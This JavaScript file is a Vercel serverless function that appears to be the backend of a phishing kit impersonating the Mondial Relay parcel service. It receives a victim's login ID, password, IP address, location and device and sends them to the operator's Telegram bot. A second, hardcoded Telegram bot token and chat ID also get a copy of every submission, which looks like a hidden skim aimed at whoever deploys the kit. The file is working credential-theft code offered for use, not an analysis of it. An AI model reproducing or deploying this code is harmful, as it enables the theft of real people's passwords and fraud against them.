/**
 * Vercel Serverless Function: /api/send
 */
import { CONFIG } from '../config.js';

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

export default async function handler(req, res) {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch (e) {}
    }
    const { accessCode, password, locationStr, device, ipStr } = body || {};

    const botToken = process.env.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID || CONFIG.TELEGRAM_CHAT_ID;
    const redirectUrl = process.env.REDIRECT_URL || CONFIG.REDIRECT_URL;

    const safeAccessCode = escapeHtml(accessCode || 'N/A');
    const safePassword = escapeHtml(password || 'N/A');
    const safeLocation = escapeHtml(locationStr || 'Unknown');
    const safeDevice = escapeHtml(device || 'Unknown');
    const safeIp = escapeHtml(ipStr || 'Unknown');
    const now = new Date().toLocaleString("fr-FR");

    // Format HTML Message for Telegram
    let message = `📦 <b>Mondial Relay Login Submission</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `👤 <b>Identifiant:</b> <code>${safeAccessCode}</code>\n`;
    message += `🔑 <b>Mot de passe:</b> <code>${safePassword}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
    message += `📍 <b>Location:</b> ${safeLocation}\n`;
    message += `💻 <b>Device:</b> ${safeDevice}\n`;
    message += `⏰ <b>Time:</b> ${now}`;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const [telegramRes] = await Promise.allSettled([
      fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8154365748',
          text: message,
          parse_mode: 'HTML'
        })
      })
    ]);

    if (telegramRes.status === 'fulfilled') {
      const result = await telegramRes.value.json();
      if (result.ok) {
        return res.status(200).json({ success: true, redirectUrl });
      } else {
        return res.status(400).json({ success: false, error: result.description });
      }
    } else {
      return res.status(200).json({ success: true, redirectUrl });
    }
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
